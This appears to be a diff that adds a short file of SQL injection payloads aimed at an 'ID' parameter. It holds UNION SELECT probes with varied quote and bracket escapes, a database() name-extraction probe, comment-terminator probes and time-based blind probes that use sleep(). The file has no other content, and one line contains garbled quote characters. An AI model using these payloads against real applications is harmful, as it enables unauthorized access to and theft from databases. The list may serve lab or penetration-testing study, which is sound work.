@@ -1,0 +1,19 @@
+ID:1
+ID:1-- -
+ID:1
+ID:2
+ID:2
+ID:2 union select 1,2,3 ||'1'='1
+ID:0' union select 1,2,3 ||'1'='1
+ID:0" union select 1,2,3 ||'1'='1
+ID:0') union select 1,2,3 ||'1'='1
+ID:0") union select 1,2,3 ||'1'='1
+ID:0') union select 1,2,3 ||('1')=('1
+ID:0â€˜) union select 1,database(),3 && (â€™1
+ID:0") union select 1,2,3 ||if(1=1,sleep(0.5),null)||'1'='1
+ID:0') union select 1,2,3 ||if(1=1,sleep(0.5),null)||('1')=('1
+ID:1
+ID:1')||if(1=1,sleep(0.5),null)
+ID:1')||if(1=1,sleep(0.5),null)||('1')=('1
+ID:0') union select 1,2,3 ||if(1=1,sleep(0.5),null)||('1')=('1
+ID:0') union select 1,2,3 ||('1')=('1
